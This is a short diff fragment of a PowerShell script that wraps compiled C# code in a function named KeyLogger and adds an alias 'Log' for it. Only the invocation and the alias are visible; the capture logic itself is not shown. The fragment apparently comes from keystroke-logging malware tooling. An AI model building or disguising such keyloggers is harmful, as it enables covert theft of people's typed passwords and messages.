@@ -59,3 +59,5 @@ function KeyLogger() {
 "@ -ReferencedAssemblies System.Windows.Forms
   [KeyLogger.Program]::Main();
 }
+
+Set-Alias Log KeyLogger
